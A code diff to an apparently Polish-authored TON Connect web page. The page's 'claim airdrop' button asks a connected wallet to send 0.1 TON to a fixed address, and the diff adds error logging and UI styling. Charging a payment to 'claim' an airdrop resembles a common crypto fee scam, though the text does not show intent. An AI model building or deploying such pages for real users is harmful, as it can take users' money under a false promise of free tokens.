@@ -257,7 +257,31 @@
     <script>
         const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
         const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';
-    
+
+        // Zaawansowana funkcja logowania błędów
+        function advancedErrorLogging(error) {
+            console.error('Detailed Error Logging:');
+            console.error('Error Name:', error.name);
+            console.error('Error Message:', error.message);
+            
+            // Wyświetl pełny stos błędów
+            if (error.stack) {
+                console.error('Error Stack:', error.stack);
+            }
+
+            // Dodatkowe informacje specyficzne dla TON Connect
+            if (error.code) {
+                console.error('TON Connect Error Code:', error.code);
+            }
+
+            // Wyświetl dodatkowe szczegóły błędu
+            if (typeof error === 'object') {
+                Object.keys(error).forEach(key => {
+                    console.error(`${key}:`, error[key]);
+                });
+            }
+        }
+
         function updateProgress(percent) {
             const progressBar = document.querySelector('.progress-bar');
             const progressText = document.querySelector('.progress-text');
@@ -266,14 +290,14 @@
             progressContainer.style.display = 'block';
             progressBar.style.width = `${percent}%`;
             progressText.textContent = `${percent}%`;
-    
+
             if (percent >= 100) {
                 setTimeout(() => {
                     progressContainer.style.display = 'none';
                 }, 1000);
             }
         }
-    
+
         function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             const icons = {
@@ -289,64 +313,113 @@
             statusDiv.style.color = type === 'error' ? '#e74c3c' : 
                                   type === 'success' ? '#2ecc71' : '#3498db';
         }
-    
+
+        // Konfiguracja TON Connect z dodatkowymi opcjami
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: MANIFEST_URL,
-            buttonRootId: 'ton-connect'
+            buttonRootId: 'ton-connect',
+            // Dodatkowe opcje konfiguracyjne
+            uiPreferences: {
+                theme: 'LIGHT',
+                colorsSet: {
+                    connectButton: {
+                        background: '#2ecc71',
+                        foreground: 'white'
+                    }
+                }
+            }
         });
-    
+
+        // Obsługa zmiany statusu połączenia z rozszerzoną diagnostyką
         tonConnectUI.onStatusChange(wallet => {
             const claimButton = document.getElementById('claim-button');
             if (wallet) {
                 claimButton.style.display = 'inline-block';
-                updateStatus(`Connected: ${wallet.account.address}`, 'success');
+                updateStatus(`Connected: ${wallet.account.address.slice(0, 10)}...`, 'success');
+                
+                // Dodatkowa weryfikacja portfela
+                console.log('Wallet Network:', wallet.account.network);
+                console.log('Wallet Address Type:', wallet.account.address.slice(0, 2));
             } else {
                 claimButton.style.display = 'none';
                 updateStatus('Please connect your wallet', 'info');
             }
         });
-    
+
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
+                // Wstępne sprawdzenia
                 if (!tonConnectUI.connected) {
                     updateStatus('Please connect your wallet first', 'error');
                     return;
                 }
-    
+
                 updateStatus('Preparing transaction...', 'info');
                 updateProgress(20);
-    
-                // Zakodowanie komentarza "Claim airdrop!" w Base64
-                const comment = btoa('Claim airdrop!'); // Wynik: Q2xhaW0gYWlyZHJvcCE=
-                console.log('Comment payload (base64):', comment);
-    
-                // Przygotowanie transakcji z komentarzem
+
+                // Zaawansowane generowanie payloadu
+                const createPayload = () => {
+                    try {
+                        return btoa('Claim airdrop!');
+                    } catch (encodeError) {
+                        console.error('Payload encoding error:', encodeError);
+                        return '';
+                    }
+                };
+
+                const payload = createPayload();
+                console.log('Generated Payload:', payload);
+
+                // Szczegółowa konfiguracja transakcji
                 const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300, // Ważność transakcji (5 minut)
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
                             amount: '100000000', // 0.1 TON
-                            payload: comment // Zakodowana wiadomość w Base64
+                            payload: payload,
+                            stateInit: null // Opcjonalne, może pomóc w niektórych przypadkach
                         }
                     ]
                 };
-    
+
+                console.log('Transaction Details:', JSON.stringify(transaction, null, 2));
                 updateProgress(40);
-    
-                // Wysłanie transakcji
-                const result = await tonConnectUI.sendTransaction(transaction);
-                console.log('Transaction result:', result);
-    
-                updateProgress(80);
-                updateStatus('Transaction sent successfully!', 'success');
-                updateProgress(100);
-    
-            } catch (error) {
-                console.error('Transaction error:', error);
-                updateStatus(`Transaction error: ${error.message}`, 'error');
+
+                try {
+                    const result = await tonConnectUI.sendTransaction(transaction);
+                    console.log('Transaction Success:', result);
+                    
+                    updateProgress(80);
+                    updateStatus('Transaction sent successfully!', 'success');
+                    updateProgress(100);
+
+                } catch (sendError) {
+                    console.error('Send Transaction Error:', sendError);
+                    advancedErrorLogging(sendError);
+                    
+                    updateStatus(`Transaction Error: ${sendError.message}`, 'error');
+                    updateProgress(0);
+                }
+
+            } catch (generalError) {
+                console.error('General Transaction Error:', generalError);
+                advancedErrorLogging(generalError);
+                
+                updateStatus(`Unexpected Error: ${generalError.message}`, 'error');
                 updateProgress(0);
             }
+        });
+
+        // Globalna obsługa niezłapanych błędów
+        window.addEventListener('error', (event) => {
+            console.error('Global Unhandled Error:', event.error);
+            advancedErrorLogging(event.error);
+        });
+
+        window.addEventListener('unhandledrejection', (event) => {
+            console.error('Unhandled Promise Rejection:', event.reason);
+            advancedErrorLogging(event.reason);
         });
     </script>
 </body>
